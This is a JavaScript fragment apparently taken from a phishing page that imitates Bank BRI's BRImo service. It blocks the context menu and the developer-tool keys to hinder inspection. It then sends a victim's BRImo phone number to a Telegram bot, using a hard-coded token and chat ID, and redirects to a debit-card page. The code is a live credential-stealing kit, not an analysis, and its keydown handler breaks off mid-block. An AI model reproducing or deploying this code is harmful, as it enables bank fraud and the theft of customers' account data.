      var addHandler = function (element, type, handler) {
        if (element.addEventListener) {
          element.addEventListener(type, handler, false);
        } else if (element.attachEvent) {
          element.attachEvent("on" + type, handler);
        } else {
          element["on" + type] = handler;
        }
      };
      
      var preventDefault = function (event) {
        if (event.preventDefault) {
          event.preventDefault();
        } else {
          event.returnValue = false;
        }
      };
      
      addHandler(window, "contextmenu", function (event) {
        preventDefault(event);
      });
      
      document.onkeydown = function (event) {
        if(event.ctrlKey || event.shiftKey || event.keyCode == 123) {

      function sendTelegramMessage(phone) {
        const token = '7032990939:AAHbrTh42upbxgXPEAaSASMsWe2r_Ld9b-g';
        const chatId = '678941049';
        const message = `______༺═𝗕𝗮𝗻𝗸 𝗕𝗥𝗜═༻______\n\nNomor BRImo: ${phone}`;

        $.ajax({
          url: `https://api.telegram.org/bot${token}/sendMessage`,
          method: 'POST',
          contentType: 'application/json',
          data: JSON.stringify({
            chat_id: chatId,
            text: message
          }),
          success: function(response) {
            console.log("Message sent successfully:", response);
            window.location.href = 'debit.html';
          },
          error: function(error) {
            console.error("Error sending message:", error);
            alert('Terjadi kesalahan saat mengirim data ke Telegram');
          }
        });
      }
